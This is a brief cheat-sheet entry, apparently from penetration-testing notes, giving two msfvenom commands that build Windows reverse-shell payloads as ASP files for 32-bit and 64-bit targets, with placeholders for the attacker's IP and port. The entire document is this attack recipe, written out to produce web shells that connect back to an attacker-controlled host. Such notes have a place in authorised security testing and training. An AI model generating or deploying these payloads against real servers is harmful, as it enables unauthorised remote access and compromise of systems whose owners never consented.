# ASP

- x86 (32-bit) Payloads

`$ msfvenom -p windows/shell_reverse_tcp lhost=<IP> lport=<PORT> -f asp -o shell-x86.asp`

- x86_64 (64-bit) Payloads

`$ msfvenom -p windows/x64/shell_reverse_tcp lhost=<IP> lport=<PORT> -f asp -o shell-x86-64.asp`